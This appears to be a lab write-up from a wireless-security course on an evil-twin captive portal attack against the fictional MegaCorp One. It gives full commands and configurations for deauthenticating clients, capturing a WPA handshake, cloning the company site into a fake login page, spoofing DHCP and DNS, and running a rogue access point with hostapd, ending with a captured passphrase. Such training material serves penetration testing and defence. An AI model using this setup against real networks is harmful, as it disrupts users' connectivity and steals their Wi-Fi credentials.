---
description: >-
  Attacking Captive Portals
title:  Attacking Captive Portals     # Add title here
date: 2023-09-28 08:00:00 -0600                           # Change the date to match completion date
categories: [18 Wireless, Wireless Attacks]                     # Change Templates to Writeup
tags: [wireless, captive portal]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Attacking Captive Portals
Captive portals are often set up on unencrypted or open networks to allow guests or employees to easily connect to the network or Internet, sometimes without credentials.

### Discovery The Target

We will begin by gathering information about our target. We need to run `sudo airmon-ng check kill` to kill any process that might interfere with our wireless card. Once that is done, we'll run `sudo airmon-ng start wlan0` to start in monitor mode.

```bash
sudo airodump-ng -w discovery --output-format pcap wlan0
 CH 12 ][ Elapsed: 0 s ][ 2020-09-14 16:23

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 00:0E:08:FA:47:CD  -51        3        2    0   6  195   WPA2 CCMP   MGT  MegaCorp One
 00:0E:08:75:69:78  -70        2        0    0   1  130   OPN              MegaCorp One Guest <-
 00:0E:08:90:3A:5F  -75        3        0    0  11  130   WPA2 CCMP   PSK  MegaCorp One Lab

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 00:0E:08:90:3A:5F  E6:D9:CA:FE:B2:3C  -45    0 - 0e     0        2
 00:0E:08:90:3A:5F  05:E3:5C:E6:D9:A3  -68    0e- 54     0        2
 00:0E:08:90:3A:5F  E6:EE:C0:FF:EE:84  -81    0 - 5e   487        6
 00:0E:08:FA:47:CD  98:D5:96:6D:25:78  -37    0 - 1e     0        2
 (not associated)   A7:AD:4B:2B:5E:EF  -54    0 - 1      3        9         Yugoslavia
 00:0E:08:75:69:78  FE:5C:BE:EF:D4:3F  -48    0 - 6      0        1
```
Then proceed to deauthenticate the users:
```bash
sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0
16:24:14  Waiting for beacon frame (BSSID: 00:0E:08:90:3A:5F) on channel 11
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
16:24:14  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:15  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:15  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:16  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:16  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:17  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:17  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:18  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:18  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:19  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
```
Shortly after this, airmon-ng captures a "MegaCorp One Lab" handshake which is now saved in our discovery-01.cap file.
```bash
 CH 12 ][ Elapsed: 0 s ][ 2020-09-14 16:23 ][WPA handshake:  00:0E:08:90:3A:5F ] <-----

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 00:0E:08:FA:47:CD  -51        9        2    0   6  205   WPA2 CCMP   MGT  MegaCorp One
 00:0E:08:75:69:78  -70        7        0    0   1  178   OPN              MegaCorp One Guest
 00:0E:08:90:3A:5F  -75       12        0    0  11  225   WPA2 CCMP   PSK  MegaCorp One Lab <-----
 ...
```
### Creating a Captive Portal
We will be using recursive mode with -r, and two levels deep, with -l2, as the background picture is referenced in a CSS, which is itself referenced in the index page.
```bash
kali@kali:~$ wget -r -l2 https://www.megacorpone.com
```
Let's create our captive portal login page, called index.php in /var/www/html/portal. Our design will be relatively simple. We will use the top line with the name of the company, followed by the background image, and a password field. We'll also include a "Connect" button.

```html
<!DOCTYPE html>
<html lang="en">

	<head>
		<link href="assets/css/style.css" rel="stylesheet">
		<title>MegaCorp One - Nanotechnology Is the Future</title>
	</head>
	<body style="background-color:#000000;">
		<div class="navbar navbar-default navbar-fixed-top" role="navigation">
			<div class="container">
				<div class="navbar-header">
					<a class="navbar-brand" style="font-family: 'Raleway', sans-serif;font-weight: 900;" href="index.php">MegaCorp One</a>
				</div>
			</div>
		</div>

		<div id="headerwrap" class="old-bd">
			<div class="row centered">
				<div class="col-lg-8 col-lg-offset-2">
					<?php
						if (isset($_GET["success"])) {
							echo '<h3>Login successful</h3>';
							echo '<h3>You may close this page</h3>';
						} else {
							if (isset($_GET["failure"])) {
								echo '<h3>Invalid network key, try again</h3><br/><br/>';
							}
					?>
				<h3>Enter network key</h3><br/><br/>
				<form action="login_check.php" method="post">
					<input type="password" id="passphrase" name="passphrase"><br/><br/>
					<input type="submit" value="Connect"/>
				</form>
				<?php
						}
				?>
				</div>

				<div class="col-lg-4 col-lg-offset-4 himg ">
					<i class="fa fa-cog" aria-hidden="true"></i>
				</div>
			</div>
		</div>

	</body>
</html>
```
We will also need to copy two directories, assets and old-site, into /var/www/html/portal since they contain the CSS and the background image.
```bash
kali@kali:~$ sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/

kali@kali:~$ sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
```

The login page form goes to login_check.php, which we will use to verify the credentials by cracking the handshake.
```bash
<?php
# Path of the handshake PCAP
$handshake_path = '/home/kali/discovery-01.cap';
# ESSID
$essid = 'MegaCorp One Lab';
# Path where a successful passphrase will be written
# Apache2's user must have write permissions
# For anything under /tmp, it's actually under a subdirectory
#  in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$success_path = '/tmp/passphrase.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and
# is within passphrase lenght limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Check if the correct passphrase has been found already ...
$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {

  # .. and if it matches the current one,
  # then redirect the client accordingly
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

# Add passphrase to wordlist ...
$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

# ... then crack the PCAP with it to see if it matches
# If ESSID contains single quotes, they need escaping
exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
# If the exit value is 0, aircrack-ng successfully ran
# We'll now have to inspect output and search for
# "KEY FOUND" to confirm the passphrase was correct
if ($retval == 0) {
	foreach($output as $line) {
		if (strpos($line, "KEY FOUND") !== FALSE) {
			$key_found = TRUE;
			break;
		}
	}
}

if ($key_found) {

  # Save the passphrase and redirect the user to the success page
  @rename($wordlist_path, $success_path);

  header('Location: index.php?success');
} else {
  # Delete temporary file and redirect user back to login page
  @unlink($wordlist_file);

  header('Location: index.php?failure');
}
?>
```
### Networking Setup
In order for this attack to work, we will need to do a bit of configuration.

We will first assign an IP address to our wlan0 interface. We'll use 192.168.87.1 with a network mask of 255.255.255.0. The IP we use doesn't matter because once the user's system detects that it can't reach the Internet, it will automatically open the IP address of the router in the browser, which is also the host of the captive portal.

kali@kali:~$ sudo ip addr add 192.168.87.1/24 dev wlan0

kali@kali:~$ sudo ip link set wlan0 up
Listing 9 - wlan0 IP address configuration

We will have clients connecting to us, and in order for them to reach our captive portal, they need an IP configuration. Thankfully, the first thing the user will do is request a Dynamic Host Configuration Protocol (DHCP)1 lease. We will provide that using dnsmasq,2 a small DNS/DHCP server. We can install dnsmasq with apt.

kali@kali:~$ sudo apt install dnsmasq
...
Listing 10 - Installing dnsmasq

We will use the following mco-dnsmasq.conf configuration file for DHCP.

```bash
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100
```

We also need to do DNS spoofing so that the response for most DNS requests will point back to us with the exception of rare cases. We'll use dnsmasq again. To do this, we will append the following to the configuration file we just created.

```bash
# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255
```

Although we are only spoofing a few generic top-level domains (gTLD), .com, .net, and .org, this should cover most of the website domains a connected user will attempt to access.

For Windows, we have to resolve dns.msftncsi.com to a specific IP address that Windows knows the result of. This will help Windows detect the captive portal.

When the EnableActiveProbing registry key in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet is set to "0", it will disable the check. If this happens, Windows will not detect our captive portal and the user won't be able to login.

Now that the configuration file is complete, let's start dnsmasq with --conf-file followed by the path of our configuration file.

```bash
kali@kali:~$ sudo dnsmasq --conf-file=mco-dnsmasq.conf
```

After startup, dnsmasq will create a file containing its process ID in /var/run/dnsmasq.pid. This will let us find and kill the process when we are done. We can inspect syslog4 to confirm it started successfully.

```bash
kali@kali:~$ sudo tail /var/log/syslog | grep dnsmasq
Sep 15 19:03:50 kali dnsmasq[18135]: started, version 2.82 cachesize 150
Sep 15 19:03:50 kali dnsmasq[18135]: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset auth DNSSEC loop-detect inotify dumpfile
Sep 15 19:03:50 kali dnsmasq-dhcp[18135]: DHCP, IP range 192.168.87.100 -- 192.168.87.199, lease time 12h
...
```
Using netstat, we can confirm it is listening on port 53 (TCP/UDP) for DNS, and on 67 (UDP) for DHCP.
```bash
kali@kali:~$ sudo netstat -lnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address    Foreign Address    State    PID/Program name
tcp        0      0 0.0.0.0:53       0.0.0.0:*          LISTEN   18135/dnsmasq
tcp6       0      0 :::53            :::*               LISTEN   18135/dnsmasq
udp        0      0 0.0.0.0:53       0.0.0.0:*                   18135/dnsmasq
udp        0      0 0.0.0.0:67       0.0.0.0:*                   18135/dnsmasq
udp6       0      0 :::53            :::*                        18135/dnsmasq
...
```

Although port 67 (UDP) is open, it is listening on 0.0.0.0 (all IP addresses), even though we specifically configured it to listen on a specific IP in Listing 11 with the listen-address parameter. This appears to be a bug.

DHCP is a broadcast protocol, and clients send broadcast frames to get any potential listening DHCP server to give them a lease. For that reason, dnsmasq isn't listening on a specific IP address but a broadcast address. Although it is listening on 0.0.0.0, it will only listen to broadcast traffic on the interface we specified. Note that netstat won't display that information. The same goes for DNS (port 53 TCP/UDP).

Sometimes clients ignore DNS settings provided in the DHCP lease, and we will use an nftables5 rule to force redirect all DNS requests (UDP to port 53 only--TCP port 53 is for zone transfer6) back to our server.

```bash
To do this, we need to install nftables and then add the rules.

kali@kali:~$ sudo apt install nftables

kali@kali:~$ sudo nft add table ip nat

kali@kali:~$ sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'

kali@kali:~$ sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```

In Apache's site configuration, we need to add mod_rewrite7 and mod_alias7:1 rules so that the captive portal is set properly. We'll add the following lines in /etc/apache2/sites-enabled/000-default.conf before the VirtualHost closing tag.

```bash
...

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>
```

These additions will require two modules to be enabled. For the first four and the last three instructions, we need the redirect module. For the two "RedirectMatch" additions in-between, we need the alias module.

Let's enable them using a2enmod.
```bash
kali@kali:~$ sudo a2enmod rewrite
Enabling module rewrite.
To activate the new configuration, you need to run:
  systemctl restart apache2

kali@kali:~$ sudo a2enmod alias
Module alias already enabled
```

Apache has a number of small utilities that allow us to enable and disable modules. We could manually create and delete symlinks in specific directories, but these utilities have auto-completion for the respective items they are dealing with.

The naming convention of the utilities makes them relatively easy to read. Each one starts with "a2", which stands for Apache2. It is followed by "en" or "dis", to indicate enabled and disabled. The last part indicates what is to be enabled or disabled, and it can be "mod", "site", or "conf", which stand for module, site, or configuration, respectively. For example, if we wanted to disable a module, we would be using a2dismod.

Let's start (or restart) Apache using systemctl restart apache2 and then make sure the portal is correctly displayed locally by pointing a browser to 127.0.0.1.

Special Case for Chrome
Chrome doesn't automatically check for captive portals on startup like Firefox. Typing a URL will trigger the captive portal, but with the above configuration, a search will fail. This may be because Chrome encodes the search and automatically prepends the search URL, which is HTTPS. With just HTTP in our Apache configuration, we will fail to connect to the website because the port isn't listening.

We can remedy this special case by making a HTTPS section in Apache. Note that doing so will break Firefox (and possibly other OS/software) if the victim clicks on the prompt to guide them to the captive portal. This is because of the self-signed certificate. It should work when the OS opens Firefox to log in. For these reasons, we only recommended this approach in an environment where only Chrome is used.

To do this, we will need to duplicate the whole VirtualHost section in the same site file, /etc/apache2/sites-enabled/000-default.conf. We will change port 80 to 443 in the VirtualHost tag, the instances of http to https in the RewriteRule and RedirectMatch statements, and finally we will add a SSL certificate.
```bash
<VirtualHost *:443>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
</VirtualHost>
```

Although we could generate our own certificates, we'll use the already generated snakeoil certificate.8

The snakeoil certificates are created when the ssl-cert package gets installed. They shouldn't be deleted. If necessary, they can be regenerated by running "make-ssl-cert generate-default-snakeoil --force-overwrite".

Afterward, we have to enable the ssl module with a2enmod and restart Apache.

```bash
kali@kali:~$ sudo a2enmod ssl
Enabling module ssl.
To activate the new configuration, you need to run:
  systemctl restart apache2

kali@kali:~$ sudo systemctl restart apache2
Listing 20 - enabling mod_ssl and restart Apache
```

### Setting Up and Running the Rogue AP
The last item on our list is the rogue AP configuration file. We will be using hostapd to run the AP. We can install it with `sudo apt install hostapd`.

We will be creating a 802.11n AP with the exact same SSID and channel as the AP we are targeting, but we won't be using any encryption.
```bash
interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP
```

Now that we have put all the pieces together, let's run hostapd and get some credentials.

We will run hostapd in the background, with -B, as it also logs in syslog.
```bash
kali@kali:~$ sudo hostapd -B mco-hostapd.conf
Configuration file: mco-hostapd.conf
nl80211: kernel reports: expected nested data
Using interface wlan0 with hwaddr 0e:31:8d:35:ea:08 and ssid "MegaCorp One Lab"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
```

As a side note, let's remember that stopping hostapd will disable the interfaces, which results in the interface losing its IP configuration. We will need to set the IP, either before or after starting hostapd. It should be done before any client connects or the DHCP will not work.

Let's open two terminal windows to inspect the logs and check connections. The first one will show us hostapd and udhcpd logs.

We will stand by and keep watching for new logs using tail -f. The second part of the command, after the pipe, will only show us logs from udhcpd and hostapd.
```bash
kali@kali:~$ sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
Aug 25 15:49:20 kali hostapd: wlan0: STA 00:c4:98:12:65:1d IEEE 802.11: authenticated
Aug 25 15:49:20 kali hostapd: wlan0: STA 00:c4:98:12:65:1d IEEE 802.11: associated (aid 1)
Aug 25 15:49:20 kali hostapd: wlan0: STA 00:c4:98:12:65:1d RADIUS: starting accounting session 8C7098041457CA7F
Aug 25 15:49:21 kali dnsmasq-dhcp[18135]: DHCPDISCOVER(wlan0) 00:c4:98:12:65:1d
Aug 25 15:49:21 kali dnsmasq-dhcp[18135]: DHCPOFFER(wlan0) 192.168.87.118 00:c4:98:12:65:1d
Aug 25 15:49:21 kali dnsmasq-dhcp[18135]: DHCPREQUEST(wlan0) 192.168.87.118 00:c4:98:12:65:1d
Aug 25 15:49:21 kali dnsmasq-dhcp[18135]: DHCPACK(wlan0) 192.168.87.118 00:c4:98:12:65:1d android-8e6f8d2da38952aa
...
```

We find a station with the MAC 00:c4:98:12:65:1d associated, and we received an IP address of 192.168.87.118 from dnsmasq.

In the second terminal, we will monitor incoming Apache logs.
```bash
kali@kali:~$ sudo tail -f /var/log/apache2/access.log
192.168.87.118 - - [25/Aug/2020:15:49:22 -0400] "GET /generate_204 HTTP/1.1" 302 568 "-" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/497.88 (KHTML, like Gecko) Version/4.0 Chrome/72.0.1535.856 Mobile Safari/497.88"
192.168.87.118 - - [25/Aug/2020:15:49:23 -0400] "GET /portal/index.php HTTP/1.1" 200 497 "-" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/497.88 (KHTML, like Gecko) Version/4.0 Chrome/72.0.1535.856 Mobile Safari/497.88"
192.168.87.118 - - [25/Aug/2020:15:49:56 -0400] "POST /portal/login_check.php HTTP/1.1" 302 235 "http://192.168.87.1/portal/index.php" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/497.88 (KHTML, like Gecko) Version/4.0 Chrome/72.0.1535.856 Mobile Safari/497.88"
192.168.87.118 - - [25/Aug/2020:15:49:57 -0400] "GET /portal/index.php?success HTTP/1.1" 200 413 "http://192.168.87.1/portal/index.php" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/497.88 (KHTML, like Gecko) Version/4.0 Chrome/72.0.1535.856 Mobile Safari/497.88"
```

On the last line, we find that a device was redirected back to the index page, and that it gave the correct passphrase.

We can now look in the /tmp directory, find our passphrase.txt, and display its content.
```bash
kali@kali:~$ sudo find /tmp/ -iname passphrase.txt
/tmp/systemd-private-0a505bfcaf7d4db699274121e3ce3849-apache2.service-lIP3ds/tmp/passphrase.txt

kali@kali:~$ sudo cat /tmp/systemd-private-0a505bfcaf7d4db699274121e3ce3849-apache2.service-lIP3ds/tmp/passphrase.txt
NanotechIsTheFuture
```